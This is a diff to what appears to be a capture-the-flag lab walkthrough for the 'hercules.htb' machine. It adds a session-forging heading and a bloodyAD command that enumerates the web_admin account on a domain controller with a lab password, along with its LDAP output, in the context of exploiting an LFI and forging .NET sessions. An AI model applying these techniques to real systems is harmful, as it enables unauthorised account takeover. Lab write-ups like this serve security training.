@@ -524,6 +524,8 @@ I have confirmed LFI
 
 This is the `web.config` file, i think i can use this to forge another session for any user
 
+# Session forging
+
 Ill create a console app (.NET framework) project in visual studio
 
 ```python
@@ -610,3 +612,24 @@ UserData: Web Users
 I managed to decrypt the session, now i can use these values to make my own for the `web_admin` user
 
 Since `ken.w` is a web user, i want to use `web_admin` so ill have to get his group membership
+
+```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k get object web_admin
+
+distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+accountExpires: 9999-12-31 23:59:59.999999+00:00
+badPasswordTime: 1601-01-01 00:00:00+00:00
+badPwdCount: 0
+cn: web_admin
+codePage: 0
+countryCode: 0
+dSCorePropagationData: 2024-12-04 01:45:07+00:00
+department: Web Administrators
+displayName: web_admin
+givenName: web_admin
+
+...[SNIP]...
+```
+
+This user is part of the `Web Administrators`
+
